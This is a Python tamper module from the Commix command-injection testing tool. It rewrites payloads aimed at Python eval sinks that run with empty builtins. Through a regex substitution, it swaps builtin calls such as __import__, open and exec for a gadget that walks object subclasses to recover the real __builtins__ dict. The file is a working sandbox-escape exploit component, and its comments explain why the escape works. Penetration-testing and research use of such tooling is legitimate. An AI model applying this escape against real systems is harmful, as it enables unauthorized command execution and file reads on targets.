#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import re

from src.utils import settings
from src.core.controller import checks

"""
About: Reaches every bare builtin the grammar calls - __import__ and open to run a command or read
       a file, len/ord/chr/int to measure and compare the answer - through the subclasses of
       object, for a sink evaluating Python with no builtins at all.
Notes: This tamper script works against target(s) evaluating Python (i.e. option '--eval=python').
       'eval(value, {"__builtins__": {}})' is a common way to let a value run as code without
       touching anything else on the system - but an empty __builtins__ only blocks every builtin
       NAME, not the language underneath it. () .__class__.__bases__[0].__subclasses__() reaches
       every class the interpreter has already loaded, through plain attribute access rather than
       any builtin call of its own, and every module's own globals still carries a real
       __builtins__ dict in them - Python puts one there itself, for every module there is. Only
       __import__ and open get the target anything on their own, but the boolean-based and
       time-based techniques never reach a comparison at all without len(), ord() and chr() too.
Notes: Written with no builtin call anywhere in the gadget itself, since an empty __builtins__
       leaves every one of them undefined too - only attribute access, indexing, a comparison and a
       list comprehension, none of which are builtins to begin with.
Reference: https://www.exploit-db.com/exploits/33028 (same shape against JRuby's own sandbox: a
           blocked native call reached instead through the host language's own object graph)
"""

__tamper__ = "pybuiltinsescape"
__priority__ = settings.PRIORITY.NORMAL

def dependencies():
  return checks.tamper_dep_command_incompatible(__tamper__) or checks.tamper_dep_grammar_only(__tamper__, "python")

if not settings.TAMPER_SCRIPTS[__tamper__]:
  settings.TAMPER_SCRIPTS[__tamper__] = True

# The first already-loaded class whose own __init__ is plain Python code rather than a compiled
# slot, so it still has __globals__ to read a real __builtins__ dict back out of.
_GADGET = (
  '[c.__init__.__globals__["__builtins__"] for c in ().__class__.__bases__[0].__subclasses__() '
  'if c.__init__.__class__.__name__=="function" and "__builtins__" in c.__init__.__globals__][0]'
)

# Every bare name the grammar ever calls - run()/read_file()/delay()/halt() need the first two,
# length()/ordinal()/to_number() the rest, and a sweep at a higher level still reaches for the
# last three once in a while.
_BUILTINS = ["__import__", "open", "len", "ord", "chr", "int", "str", "repr", "eval", "exec"]

def tamper(payload):
  if settings.EVAL_GRAMMAR.NAME != "python":
    return payload
  # A plain substitution would also catch, say, 'open(' inside a longer word - excluded for every
  # name here by requiring nothing identifier-like just ahead of it, not only the short ones.
  for name in _BUILTINS:
    payload = re.sub(r'(?<![A-Za-z0-9_])' + re.escape(name) + r'\(', '(' + _GADGET + ')["' + name + '"](', payload)
  return payload

# eof
